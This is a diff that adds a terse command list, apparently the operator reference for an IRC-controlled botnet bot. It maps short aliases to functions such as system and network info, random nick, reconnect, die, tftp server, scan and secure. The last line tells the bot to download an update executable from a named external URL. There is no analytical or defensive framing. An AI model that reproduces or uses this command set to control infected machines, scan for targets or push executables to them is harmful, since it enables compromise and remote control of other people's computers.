@@ -1,0 +1,38 @@
+com.si = sysinfo
+com.ni = netinfo
+com.ps = processinfo
+com.up = Uptime
+com.ps.on/off / process threads
+com.r = restart
+
+
+
+
+irc.rn = random nick
+irc.di = die
+irc.r = reconnect
+irc.d = disconnect
+irc.q = irc quit
+irc.s = status
+irc.i = ID
+irc.al = alias
+irc.lg = log
+
+
+util.clg = clearlog
+
+
+
+threads.l = threads
+
+cip = current ip
+lo = logout
+ver = version
+Log List = logliste
+Server = tftp server
+secure = secure
+scan = scannen 
+st = stats
+
+
+.h de80570d4ba7cbc7b8f824710dbcabe8 = dl update from http://mitglied.lycos.de/zinglerlaatzen/dis.exe
